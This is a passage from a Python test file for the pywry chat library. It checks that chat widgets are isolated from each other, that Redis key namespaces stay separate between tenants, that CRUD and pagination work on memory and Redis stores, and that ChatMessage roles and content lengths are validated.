        _send_and_wait(mgr_a, widget_a, "question for A")
        _send_and_wait(mgr_b, widget_b, "question for B")

        a_texts = widget_a.all_assistant_texts()
        b_texts = widget_b.all_assistant_texts()

        assert any("response-A" in t for t in a_texts), "Widget A must see its own responses"
        assert all("response-B" not in t for t in a_texts), "Widget A must NOT see B's responses"

        assert any("response-B" in t for t in b_texts), "Widget B must see its own responses"
        assert all("response-A" not in t for t in b_texts), "Widget B must NOT see A's responses"

    def test_thread_list_events_are_widget_scoped(self) -> None:
        """chat:update-thread-list events land only on the correct widget."""
        widget_a = FakeWidget()
        widget_b = FakeWidget()

        mgr_a = ChatManager(handler=lambda m, c: "ok")
        mgr_a.bind(widget_a)

        mgr_b = ChatManager(handler=lambda m, c: "ok")
        mgr_b.bind(widget_b)

        # Create a thread in A; only A should get the updated thread list
        widget_a.clear()
        widget_b.clear()
        mgr_a._on_thread_create({"title": "New Thread"}, *[""] * 2)

        assert widget_a.get_events("chat:update-thread-list"), "A must receive thread update"
        assert not widget_b.get_events("chat:update-thread-list"), (
            "B must NOT receive A's thread update"
        )


# ===========================================================================
# 11. Redis key namespace enforcement
# ===========================================================================


@pytest.mark.redis
@pytest.mark.container
class TestRedisKeyNamespace:
    """Verify that RedisChatStore uses distinct Redis keys for each widget,
    preventing key collisions that would leak data between tenants.
    Runs against a REAL Redis container."""

    @pytest.mark.asyncio
    async def test_key_names_include_widget_id(
        self, redis_store, redis_container, redis_test_prefix
    ) -> None:
        """Thread keys must include the widget_id so they can't collide."""
        from redis.asyncio import Redis as AsyncRedis

        wid_a = "tenant-alice"
        wid_b = "tenant-bob"

        thread = _make_thread("secret thread")
        await redis_store.save_thread(wid_a, thread)

        # Connect directly to the real Redis and inspect keys
        client = AsyncRedis.from_url(redis_container, decode_responses=True)
        try:
            all_keys = await client.keys(f"{redis_test_prefix}:*")
            alice_keys = [k for k in all_keys if wid_a in k]
            bob_keys = [k for k in all_keys if wid_b in k]

            assert alice_keys, "Alice's keys must exist in Redis"
            assert not bob_keys, "Bob has no data; no keys for him"
        finally:
            await client.aclose()

    @pytest.mark.asyncio
    async def test_different_prefixes_fully_isolated(self, redis_container) -> None:
        """Two RedisChatStore instances with different prefixes share no keys."""
        from pywry.state.redis import RedisChatStore

        # Use unique base prefix to avoid colliding with other tests
        base = f"ns_test_{uuid.uuid4().hex[:8]}"
        store_app1 = RedisChatStore(redis_url=redis_container, prefix=f"{base}_app1")
        store_app2 = RedisChatStore(redis_url=redis_container, prefix=f"{base}_app2")

        wid = "same-widget-id"
        thread = _make_thread("shared widget, different app")
        await store_app1.save_thread(wid, thread)
        await store_app2.save_thread(wid, thread)
        await store_app1.append_message(wid, thread.thread_id, _make_message("user", "app1 msg"))
        await store_app2.append_message(wid, thread.thread_id, _make_message("user", "app2 msg"))

        msgs1 = await store_app1.get_messages(wid, thread.thread_id, limit=100)
        msgs2 = await store_app2.get_messages(wid, thread.thread_id, limit=100)

        texts1 = [m.text_content() for m in msgs1]
        texts2 = [m.text_content() for m in msgs2]

        assert texts1 == ["app1 msg"], f"app1 store unexpectedly contains: {texts1}"
        assert texts2 == ["app2 msg"], f"app2 store unexpectedly contains: {texts2}"

    @pytest.mark.asyncio
    async def test_delete_from_one_prefix_doesnt_touch_other(self, redis_container) -> None:
        """Deleting a thread in app1 must not delete app2's thread."""
        from pywry.state.redis import RedisChatStore

        base = f"del_test_{uuid.uuid4().hex[:8]}"
        store1 = RedisChatStore(redis_url=redis_container, prefix=f"{base}_ns1")
        store2 = RedisChatStore(redis_url=redis_container, prefix=f"{base}_ns2")

        wid = "shared-wid"
        tid = _make_thread_id()
        t = ChatThread(thread_id=tid, title="Same ID, different namespaces")

        await store1.save_thread(wid, t)
        await store2.save_thread(wid, t)
        await store1.append_message(wid, tid, _make_message("user", "ns1 msg"))
        await store2.append_message(wid, tid, _make_message("user", "ns2 msg"))

        # Delete from namespace 1 only
        deleted = await store1.delete_thread(wid, tid)
        assert deleted is True

        # Namespace 1 is gone
        assert await store1.get_thread(wid, tid) is None

        # Namespace 2 is intact
        t2 = await store2.get_thread(wid, tid)
        assert t2 is not None
        msgs2 = await store2.get_messages(wid, tid)
        assert len(msgs2) == 1
        assert msgs2[0].text_content() == "ns2 msg"


# ===========================================================================
# 12. Smoke test — MemoryChatStore basic CRUD
# ===========================================================================


class TestMemoryChatStoreCRUD:
    """Baseline CRUD smoke tests for MemoryChatStore."""

    @pytest.mark.asyncio
    async def test_save_and_get_thread(self, memory_store: MemoryChatStore) -> None:
        wid = _make_widget_id()
        thread = ChatThread(title="Smoke test thread", metadata={"k": "v"})
        await memory_store.save_thread(wid, thread)

        fetched = await memory_store.get_thread(wid, thread.thread_id)
        assert fetched is not None
        assert fetched.thread_id == thread.thread_id
        assert fetched.title == "Smoke test thread"

    @pytest.mark.asyncio
    async def test_get_nonexistent_thread(self, memory_store: MemoryChatStore) -> None:
        wid = _make_widget_id()
        fetched = await memory_store.get_thread(wid, "does-not-exist")
        assert fetched is None

    @pytest.mark.asyncio
    async def test_delete_returns_false_if_absent(self, memory_store: MemoryChatStore) -> None:
        wid = _make_widget_id()
        result = await memory_store.delete_thread(wid, "ghost-thread")
        assert result is False

    @pytest.mark.asyncio
    async def test_get_messages_empty_thread(self, memory_store: MemoryChatStore) -> None:
        wid = _make_widget_id()
        thread = _make_thread()
        await memory_store.save_thread(wid, thread)

        msgs = await memory_store.get_messages(wid, thread.thread_id)
        assert msgs == []

    @pytest.mark.asyncio
    async def test_get_messages_nonexistent_thread(self, memory_store: MemoryChatStore) -> None:
        wid = _make_widget_id()
        msgs = await memory_store.get_messages(wid, "ghost")
        assert msgs == []

    @pytest.mark.asyncio
    async def test_append_to_nonexistent_thread_is_noop(
        self, memory_store: MemoryChatStore
    ) -> None:
        """Appending to a thread that was never saved must not crash."""
        wid = _make_widget_id()
        await memory_store.append_message(wid, "ghost-thread", _make_message("user", "hello"))
        msgs = await memory_store.get_messages(wid, "ghost-thread")
        assert msgs == []

    @pytest.mark.asyncio
    async def test_pagination_limit(self, memory_store: MemoryChatStore) -> None:
        wid = _make_widget_id()
        thread = _make_thread()
        await memory_store.save_thread(wid, thread)
        for i in range(20):
            await memory_store.append_message(
                wid, thread.thread_id, _make_message("user", f"msg-{i}")
            )

        page = await memory_store.get_messages(wid, thread.thread_id, limit=5)
        assert len(page) == 5
        # The LAST 5 messages (most recent)
        assert page[-1].text_content() == "msg-19"

    @pytest.mark.asyncio
    async def test_pagination_before_id(self, memory_store: MemoryChatStore) -> None:
        wid = _make_widget_id()
        thread = _make_thread()
        await memory_store.save_thread(wid, thread)
        msgs = [_make_message("user", f"p-{i}") for i in range(10)]
        for m in msgs:
            await memory_store.append_message(wid, thread.thread_id, m)

        pivot = msgs[5].message_id
        page = await memory_store.get_messages(wid, thread.thread_id, limit=100, before_id=pivot)
        texts = [m.text_content() for m in page]
        assert "p-5" not in texts, "The pivot message itself must not be included"
        assert "p-4" in texts
        assert len(page) == 5  # p-0 through p-4


# ===========================================================================
# 13. Smoke test — RedisChatStore basic CRUD
# ===========================================================================


@pytest.mark.redis
@pytest.mark.container
class TestRedisChatStoreCRUD:
    """Baseline CRUD smoke tests for RedisChatStore against a REAL Redis container."""

    @pytest.mark.asyncio
    async def test_save_and_get_thread(self, redis_store) -> None:
        wid = _make_widget_id()
        thread = ChatThread(title="Redis smoke thread")
        await redis_store.save_thread(wid, thread)

        fetched = await redis_store.get_thread(wid, thread.thread_id)
        assert fetched is not None
        assert fetched.thread_id == thread.thread_id
        assert fetched.title == "Redis smoke thread"

    @pytest.mark.asyncio
    async def test_list_threads_empty(self, redis_store) -> None:
        wid = _make_widget_id()
        threads = await redis_store.list_threads(wid)
        assert threads == []

    @pytest.mark.asyncio
    async def test_list_threads_after_adds(self, redis_store) -> None:
        wid = _make_widget_id()
        for i in range(3):
            await redis_store.save_thread(wid, _make_thread(f"T{i}"))
        threads = await redis_store.list_threads(wid)
        assert len(threads) == 3

    @pytest.mark.asyncio
    async def test_delete_thread(self, redis_store) -> None:
        wid = _make_widget_id()
        thread = _make_thread()
        await redis_store.save_thread(wid, thread)
        await redis_store.append_message(wid, thread.thread_id, _make_message("user", "bye"))

        deleted = await redis_store.delete_thread(wid, thread.thread_id)
        assert deleted is True

        after = await redis_store.get_thread(wid, thread.thread_id)
        assert after is None

        after_msgs = await redis_store.get_messages(wid, thread.thread_id)
        assert after_msgs == []

        remaining = await redis_store.list_threads(wid)
        assert all(t.thread_id != thread.thread_id for t in remaining)

    @pytest.mark.asyncio
    async def test_delete_nonexistent_returns_false(self, redis_store) -> None:
        wid = _make_widget_id()
        result = await redis_store.delete_thread(wid, "ghost")
        assert result is False

    @pytest.mark.asyncio
    async def test_message_ordering_preserved(self, redis_store) -> None:
        wid = _make_widget_id()
        thread = _make_thread()
        await redis_store.save_thread(wid, thread)

        payloads = [f"msg-{i}" for i in range(10)]
        for p in payloads:
            await redis_store.append_message(wid, thread.thread_id, _make_message("user", p))

        retrieved = await redis_store.get_messages(wid, thread.thread_id, limit=100)
        assert [m.text_content() for m in retrieved] == payloads


# ===========================================================================
# 14. ChatMessage role and content model validation
# ===========================================================================


class TestChatMessageValidation:
    """Validate role constraints and content validation on ChatMessage."""

    @pytest.mark.parametrize("role", ["user", "assistant", "system", "tool"])
    def test_valid_roles(self, role: str) -> None:
        msg = ChatMessage(role=role, content="hello")  # type: ignore[arg-type]
        assert msg.role == role

    def test_invalid_role_rejected(self) -> None:
        import pydantic

        with pytest.raises(pydantic.ValidationError):
            ChatMessage(role="admin", content="escalate")  # type: ignore[arg-type]

    def test_empty_content_is_valid(self) -> None:
        msg = ChatMessage(role="user", content="")
        assert msg.text_content() == ""

    def test_multiline_content_preserved(self) -> None:
        text = "line1\nline2\n\nline4"
        msg = ChatMessage(role="user", content=text)
        assert msg.text_content() == text

    def test_unicode_content_preserved(self) -> None:
        text = "Hello \U0001f600 \u00e9\u0300 emoji 🎉"
        msg = ChatMessage(role="user", content=text)
        restored = ChatMessage.model_validate_json(msg.model_dump_json())
        assert restored.text_content() == text

    def test_message_id_auto_generated(self) -> None:
        m1 = ChatMessage(role="user", content="a")
        m2 = ChatMessage(role="user", content="b")
        assert m1.message_id != m2.message_id
        assert m1.message_id.startswith("msg_")

    def test_timestamp_is_recent(self) -> None:
        before = time.time()
        msg = ChatMessage(role="user", content="ts test")
        after = time.time()
        assert before <= msg.timestamp <= after

    def test_content_length_at_boundary(self) -> None:
        import pydantic

        exact = "x" * MAX_CONTENT_LENGTH
        msg = ChatMessage(role="user", content=exact)
        assert len(msg.text_content()) == MAX_CONTENT_LENGTH

        over = "x" * (MAX_CONTENT_LENGTH + 1)
        with pytest.raises(pydantic.ValidationError):
            ChatMessage(role="user", content=over)
